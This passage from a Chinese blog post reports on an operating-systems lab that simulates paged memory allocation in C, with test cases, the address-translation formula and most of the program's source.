href="#逻辑地址溢出" class="headerlink" title="逻辑地址溢出"></a>逻辑地址溢出</h4><p><img src="https://www.freeimg.cn/i/2023/12/19/658138d8ef5b4.png" alt="溢出"></p><h4 id="查看不存在进程的物理地址"><a href="#查看不存在进程的物理地址" class="headerlink" title="查看不存在进程的物理地址"></a>查看不存在进程的物理地址</h4><p><img src="https://www.freeimg.cn/i/2023/12/19/658138c644af7.png"></p><h4 id="释放不存在进程内存"><a href="#释放不存在进程内存" class="headerlink" title="释放不存在进程内存"></a>释放不存在进程内存</h4><p><img src="https://www.freeimg.cn/i/2023/12/19/658138a4e325f.png" alt="释放内存"></p><h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h2><h4 id="问题-1"><a href="#问题-1" class="headerlink" title="问题 1"></a>问题 1</h4><p>第一版的程序没有考虑内存分配时的随机性</p><h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案 1"></a>解决方案 1</h4><p>时间作为随机数种子，模拟进程内存的随机分配</p><h4 id="问题-2"><a href="#问题-2" class="headerlink" title="问题 2"></a>问题 2</h4><p>进程大小 Size 只能以 bit 为单位，与实际不太相符</p><h4 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案 2"></a>解决方案 2</h4><p>实现自定义进程大小单位</p><h2 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h2><h4 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ProcessID  Size(bit)</span><br><span class="line">31234</span><br><span class="line">22222</span><br><span class="line">11111</span><br><span class="line">55555</span><br><span class="line">44444</span><br></pre></td></tr></table></figure><p>初始化</p><ol><li>计算进程所需页数</li><li>空块管理，即位视图相应位置 1</li><li>进行内存分配</li><li>进入进程队列</li></ol><p>操作选项当中本次实验的重点就是逻辑地址与物理地址的转换</p><p>计算公式：物理地址 &#x3D; 页号 * 块（页）大小 + 逻辑地址（偏移量）</p><p>经过分析，运行结果市正确的，程序完全符合本次实验要求</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span> <span class="comment">//确保包含了这个头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COUNT 32768   <span class="comment">//块数量 128M/4K</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE 4096   <span class="comment">//块大小 4*1024</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> BLOCK[COUNT];  <span class="comment">//物理块状态 0空闲1占用 使用位视图记录空块</span></span><br><span class="line"><span class="type">int</span> BlankBlockNum=COUNT;  <span class="comment">//空块数量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ProcessList</span> //进程属性</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> ID; <span class="comment">//进程号</span></span><br><span class="line"><span class="type">int</span> Size; <span class="comment">//进程大小</span></span><br><span class="line"><span class="type">int</span> Pages; <span class="comment">//所需页数</span></span><br><span class="line"><span class="type">int</span> Page[<span class="number">100</span>]; <span class="comment">//页表 </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProcessList</span> *<span class="title">next</span>;</span> <span class="comment">//下一进程指针</span></span><br><span class="line">&#125;Process;</span><br><span class="line"></span><br><span class="line">Process *head=<span class="literal">NULL</span>; <span class="comment">//进程队列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出颜色字体</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">color_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* color_code, <span class="type">const</span> <span class="type">char</span>* format, ...)</span> &#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, color_code); <span class="comment">// 设置颜色</span></span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args); <span class="comment">// 打印格式化的文本</span></span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>); <span class="comment">// 重置到默认颜色</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">red_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> &#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">blue_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">green_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> </span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">darkgreen_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> </span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[36m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">yellow_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> </span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">purple_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> </span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[35m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InitProcess</span><span class="params">()</span> <span class="comment">//初始化进程</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> num,RandomNumber;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please enter the number of processes:\n&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">    <span class="keyword">if</span>(num&lt;<span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        yellow_printf(<span class="string">&quot;The number of processes is at least 5, please re-enter it:\n&quot;</span>);</span><br><span class="line">        <span class="comment">// num=0;</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">    &#125;</span><br><span class="line">Process *temp;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num;i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = (Process*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Process));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;----------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the sequence number and size of the process:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;temp-&gt;ID,&amp;temp-&gt;Size);</span><br><span class="line"><span class="keyword">if</span>(i&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">Process *check;</span><br><span class="line">check=head;</span><br><span class="line"><span class="keyword">while</span> (check != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(temp-&gt;ID==check-&gt;ID)</span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;The process already exists, please re-enter it:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;temp-&gt;ID,&amp;temp-&gt;Size);</span><br><span class="line"><span class="keyword">if</span>(temp-&gt;ID!=check-&gt;ID) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">check=check-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//计算进程所需的页数</span></span><br><span class="line"><span class="keyword">if</span>(temp-&gt;Size%SIZE==<span class="number">0</span>) <span class="comment">//能整除</span></span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;Pages = temp-&gt;Size/SIZE; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//不足一页的部分另起一页</span></span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;Pages = temp-&gt;Size/SIZE+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//空块管理 </span></span><br><span class="line"><span class="keyword">if</span>(temp-&gt;Pages&lt;BlankBlockNum)</span><br><span class="line">&#123;</span><br><span class="line">BlankBlockNum -=temp-&gt;Pages;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;Sorry,there is not enough memory space to allocate!\n&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//分配内存 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;temp-&gt;Pages;j++)</span><br><span class="line">&#123;</span><br><span class="line">srand(time(<span class="number">0</span>)); <span class="comment">//随机数种子</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">                <span class="comment">//模拟实际内存分配不连续性（随机分配）</span></span><br><span class="line">RandomNumber = rand()%<span class="number">32768</span>;</span><br><span class="line"><span class="keyword">if</span>(BLOCK[RandomNumber]==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;Page[j] = RandomNumber;</span><br><span class="line">BLOCK[RandomNumber] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">green_printf(<span class="string">&quot;Process %d memory allocation succeeded!\n&quot;</span>,temp-&gt;ID);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The page table is as follows:\n&quot;</span>);</span><br><span class="line">blue_printf(<span class="string">&quot;Page PhyBlock\n&quot;</span>); </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;temp-&gt;Pages;j++)</span><br><span class="line">&#123;</span><br><span class="line">blue_printf(<span class="string">&quot; %d   %d\n&quot;</span>,j,temp-&gt;Page[j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//放入进程链表 </span></span><br><span class="line"><span class="keyword">if</span>(head == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">head = temp;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Process *temp2;</span><br><span class="line">temp2 = head;</span><br><span class="line"><span class="keyword">while</span>(temp2-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp2 = temp2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">temp2-&gt;next = temp;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> RandomNumber;</span><br><span class="line">Process *temp;</span><br><span class="line">temp = (Process*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Process));</span><br><span class="line"><span class="comment">// printf(&quot;----------------------------------------------------------------------\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the sequence number and size of the process:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;temp-&gt;ID,&amp;temp-&gt;Size);</span><br><span class="line"></span><br><span class="line">Process *check;</span><br><span class="line">check=head;</span><br><span class="line"><span class="keyword">while</span> (check != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(temp-&gt;ID==check-&gt;ID)</span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;The process already exists, please re-enter it:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;temp-&gt;ID,&amp;temp-&gt;Size);</span><br><span class="line"><span class="keyword">if</span>(temp-&gt;ID!=check-&gt;ID) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">check=check-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算进程所需的页数</span></span><br><span class="line"><span class="keyword">if</span>(temp-&gt;Size%SIZE==<span class="number">0</span>) <span class="comment">//能整除</span></span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;Pages = temp-&gt;Size/SIZE; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//不足一页的部分另起一页</span></span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;Pages = temp-&gt;Size/SIZE+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//空块管理 </span></span><br><span class="line"><span class="keyword">if</span>(temp-&gt;Pages&lt;BlankBlockNum)</span><br><span class="line">&#123;</span><br><span class="line">BlankBlockNum -=temp-&gt;Pages;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">red_printf(<span class="string">&quot;Sorry,there is not enough memory space to allocate!\n&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//分配内存 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;temp-&gt;Pages;j++)</span><br><span class="line">&#123;</span><br><span class="line">srand(time(<span class="number">0</span>)); <span class="comment">//随机数种子</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//模拟实际内存分配不连续性（随机分配）</span></span><br><span class="line">RandomNumber = rand()%<span class="number">32768</span>;</span><br><span class="line"><span class="keyword">if</span>(BLOCK[RandomNumber]==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp-&gt;Page[j] = RandomNumber;</span><br><span class="line">BLOCK[RandomNumber] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">green_printf(<span class="string">&quot;Process %d memory allocation succeeded!\n&quot;</span>,temp-&gt;ID);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The page table is as follows:\n&quot;</span>);</span><br><span class="line">blue_printf(<span class="string">&quot;Page PhyBlock\n&quot;</span>); </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;temp-&gt;Pages;j++)</span><br><span class="line">&#123;</span><br><span class="line">blue_printf(<span class="string">&quot; %d   %d\n&quot;</span>,j,temp-&gt;Page[j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//放入进程链表 </span></span><br><span class="line"><span class="keyword">if</span>(head == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">head = temp;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Process *temp2;</span><br><span class="line">temp2 = head;</span><br><span class="line"><span class="keyword">while</span>(temp2-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp2 = temp2-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">temp2-&gt;next = temp;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">showMemory</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Process *Memorytemp;</span><br><span class="line">Memorytemp = head;</span><br><span class="line">green_printf(<span class="string">&quot;The current process memory allocation is as follows:\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(Memorytemp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">yellow_printf(<span class="string">&quot;Process %d\n&quot;</span>,Memorytemp-&gt;ID);</span><br><span class="line">blue_printf(<span class="string">&quot;Page PhyBlock\n&quot;</span>); </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;Memorytemp-&gt;Pages;j++)</span><br><span class="line">&#123;</span><br><span class="line">blue_printf(<span class="string">&quot; %d   %d\n&quot;</span>,j,Memorytemp-&gt;Page[j]);</span><br><span class="line">&#125;</span><br><span class="line">Memorytemp = Memorytemp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Release</span><span class="params">(<span class="type">int</span> id)</span></span><br><span class="line">&#123;</span><br><span class="line">Process *temp,*temp1,*temp2;</span><br><span 